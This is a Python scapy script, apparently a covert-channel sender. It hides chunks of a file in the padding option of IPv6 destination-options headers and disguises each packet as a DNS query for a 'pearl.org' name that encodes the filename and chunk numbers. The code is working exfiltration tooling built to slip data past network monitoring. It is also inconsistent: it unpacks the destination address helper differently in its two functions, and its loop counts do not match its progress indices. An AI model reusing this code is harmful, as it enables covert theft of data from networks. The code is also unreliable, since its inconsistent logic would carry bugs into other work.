import getinfo
from scapy.all import *
def generate_send(filename, cw_list, cw_cnt, pad_bytes):
    dnsIP = getinfo.dst_addrs()
    fqdn_prefix = filename + '.' + str(cw_cnt) + '.'
    fqdn_suffix = '.' + str(pad_bytes) + '.pearl.org'
    for chunk_num in range(cw_cnt):
        for slice in range(16):
            fqdn = fqdn_prefix + str(chunk_num) + fqdn_suffix
            pkt = IPv6(dst=dnsIP)/ \
                  IPv6ExtHdrDestOpt(options=PadN(otype=30, optdata=cw_list[chunk_num][slice]))/ \
                  UDP(dport=53)/ \
                  DNS(id=slice, qd=DNSQR(qname=fqdn, qtype="A"))
            send(pkt, verbose=0)
            print("Transfer progress: packet index [{}]".format(chunk_num * 16 + slice), end = '\r')
    return True

def pkt_loss_send(filename, cwlist, cw_cnt, last):
    dnsMAC, dnsIP = getinfo.dst_addrs()
    whohas_pre = filename + '.' + str(cw_cnt) + '.'
    for cw in range(cw_cnt):
        for i in range(15):
            whohas = whohas_pre + str(cw) + '.' + str(last) + '.pearl.org'
            pkt = IPv6(dst=dnsIP)/IPv6ExtHdrDestOpt(options=PadN(otype=30, optdata=cwlist[cw][i]))/UDP(dport=53)/DNS(id=i, qd=DNSQR(qname=whohas, qtype="A"))
            send(pkt, verbose=0)
            print("Packets sended: index [{}]".format(cw * 16 + i), end = '\r')
    return cw_cnt*15
